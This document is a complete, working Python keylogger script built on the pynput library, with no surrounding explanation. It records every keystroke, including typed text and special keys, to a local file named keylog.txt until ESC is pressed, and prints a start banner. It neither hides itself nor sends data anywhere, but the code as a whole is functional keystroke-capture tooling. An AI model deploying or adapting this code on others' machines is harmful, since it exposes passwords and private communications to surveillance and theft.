from pynput import keyboard

def on_press(key):
    try:
        # Record alphanumeric keys
        with open("keylog.txt", "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        # Record special keys (enter, space, etc.)
        with open("keylog.txt", "a") as log_file:
            if key == keyboard.Key.space:
                log_file.write(" ")
            elif key == keyboard.Key.enter:
                log_file.write("\n")
            else:
                # Provide a clean format for other keys
                log_file.write(f" [{str(key)}] ")

def on_release(key):
    # Stop the program if ESC is pressed
    if key == keyboard.Key.esc:
        return False

def main():
    print("--- Keylogger Started ---")
    print("Typing will be saved to keylog.txt")
    print("Press 'ESC' to stop.")
    
    # Start the listener
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()